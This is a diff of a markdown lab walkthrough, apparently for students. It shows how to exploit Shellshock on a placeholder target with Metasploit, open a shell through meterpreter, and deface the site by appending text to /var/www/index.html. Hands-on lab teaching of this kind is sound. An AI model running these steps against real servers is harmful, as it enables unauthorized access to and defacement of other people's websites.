@@ -3,9 +3,13 @@
 ## Background
 What is metasploit, what is shellshock, etc.C  
 
+## Viewing the Website
+
+Open your browser and head to http://<TARGET_IP>:8080
+
 ## Setup
 Click the Black Box with the "$_" to open the terminal.
-![terminal](terminal.png)
+![terminal](terminal.PNG)
 
 ## Attacking the Box - Commands To Run
 This will open the Metasploit Console.
@@ -29,24 +33,59 @@ This is seeing the module and payload options that will be configured.
 
 4. `options`
 
-![options](options.png)
+![options](options.PNG)
 
 Setting the vulnerable cgi page to utilize.
 
 5. `set targeturi /cgi-bin/vulnerable`
 
-![targeturi](targeturi.png)
+![targeturi](targeturi.PNG)
 
 Setting the target hosting the site that we will attack.
 
 6. `set rhosts <TARGET_IP>`
 
+Setting the port the website is being hosted on.
+
+7. `set rport 8080`
+
+![rport](rport.PNG)
+
 Attack the box!
 
 7. `exploit`
 
+![exploit](exploit.PNG)
+
 With the meterpreter prompt, enter `shell` to spawn a bash prompt on the box.
 
-8. 
+8. `shell`
 
-## adding your own page
+![shell](shell.PNG)
+
+## Modifying the Website
+
+With your shell, now you can modify the website. Run the pwd command to see your path (location) on the remote box.
+
+1. `pwd`
+
+![pwd](whoamiandpwd.PNG)
+
+Most websites by default keep their files in `/var/www`. Change to this directory and list the contents.
+
+2. `cd /var/www`
+3. `ls`
+
+![cdandls](cdandls.PNG)
+
+The `index.html` file contains the main page of the website. Add your name to it below. 
+
+The `echo` command will write what you give it into the file given. MAKE SURE TO USE TWO (2) '>' keys!
+
+4. `echo 'your_name_here' >> index.html`
+
+![echo](addyourname.PNG)
+
+Now visit the website and see that your name has been publicly added!
+
+Now it's your turn, find out how to add a page of your own to the site. (Hint: use the `touch` command)
